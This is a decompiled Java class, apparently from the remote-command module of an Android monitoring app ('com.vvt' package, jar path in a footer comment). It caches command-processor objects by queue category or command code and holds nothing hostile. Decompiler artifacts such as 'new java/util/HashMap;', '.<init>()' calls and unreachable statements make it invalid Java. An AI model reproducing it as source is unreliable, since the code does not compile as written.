package com.vvt.remotecommand.a;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import java.util.HashMap;

public class g
{
  private HashMap a;
  
  public g()
  {
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    this.a = localHashMap;
  }
  
  public b a(RemoteCommandProcessor paramRemoteCommandProcessor, RemoteCommand paramRemoteCommand)
  {
    Object localObject1 = paramRemoteCommandProcessor.d();
    boolean bool = false;
    Object localObject2 = null;
    Object localObject3 = RemoteCommandProcessor.QueueCategory.MAIN;
    if (localObject1 == localObject3)
    {
      localObject2 = this.a;
      localObject3 = ((RemoteCommandProcessor.QueueCategory)localObject1).toString();
      bool = ((HashMap)localObject2).containsKey(localObject3);
      if (bool)
      {
        localObject2 = this.a;
        localObject1 = ((RemoteCommandProcessor.QueueCategory)localObject1).toString();
        localObject2 = (b)((HashMap)localObject2).get(localObject1);
      }
    }
    for (;;)
    {
      return (b)localObject2;
      localObject2 = new com/vvt/remotecommand/a/b;
      ((b)localObject2).<init>();
      localObject3 = this.a;
      localObject1 = ((RemoteCommandProcessor.QueueCategory)localObject1).toString();
      ((HashMap)localObject3).put(localObject1, localObject2);
      continue;
      localObject3 = RemoteCommandProcessor.QueueCategory.INDIVIDUAL;
      if (localObject1 == localObject3)
      {
        localObject2 = this.a;
        localObject1 = paramRemoteCommand.getCode();
        bool = ((HashMap)localObject2).containsKey(localObject1);
        if (bool)
        {
          localObject2 = this.a;
          localObject1 = paramRemoteCommand.getCode();
          localObject2 = (b)((HashMap)localObject2).get(localObject1);
        }
        else
        {
          localObject2 = new com/vvt/remotecommand/a/b;
          ((b)localObject2).<init>();
          localObject1 = this.a;
          localObject3 = paramRemoteCommand.getCode();
          ((HashMap)localObject1).put(localObject3, localObject2);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/a/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */